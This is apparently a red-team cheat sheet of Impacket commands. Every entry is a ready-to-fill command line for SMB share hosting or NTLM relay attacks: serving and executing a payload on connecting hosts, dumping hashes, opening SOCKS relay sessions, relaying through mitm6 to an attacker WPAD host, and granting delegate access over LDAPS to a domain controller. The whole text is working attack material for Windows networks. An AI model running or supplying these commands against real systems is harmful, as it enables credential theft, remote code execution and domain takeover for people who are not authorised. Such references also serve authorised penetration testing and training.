# Impacket

## smbserver - share smb folder
#platform/linux #target/serve #port/445 #protocol/smb #cat/ATTACK/LISTEN-SERVE 

A Python implementation of an SMB server. Allows to quickly set up shares and user accounts.

```
smbserver.py <shareName> <sharePath>
```

## smbserver - share smb folder with authentication
#platform/linux #target/serve #port/445 #protocol/smb #cat/ATTACK/LISTEN-SERVE 

```
smbserver.py -username <username> -password <password> <shareName> <sharePath>
```

## ntlmrelay - host a payload that will automatically be served to the remote host connecting
#platform/linux #target/serve #cat/ATTACK/MITM 

```
ntlmrelayx.py -tf <targets_file> -smb2support -e <payload_file|payload.exe>
```

## ntlmrelay - socks
#platform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -tf <targets_file> -socks -smb2support
```

## ntlmrelay - authenticate and dump hash
#platform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -tf <targets_file> -smb2support
```

## ntlmrelay - to use with mitm6 - relay to target
#platform/linux #target/serve #cat/ATTACK/MITM 
Next use the socks with proxychains : 
proxychains smbclient //ip/Users -U domain/user

```
ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
```

## ntlmrelay - to use with mitm6 - delegate access
#platform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
```
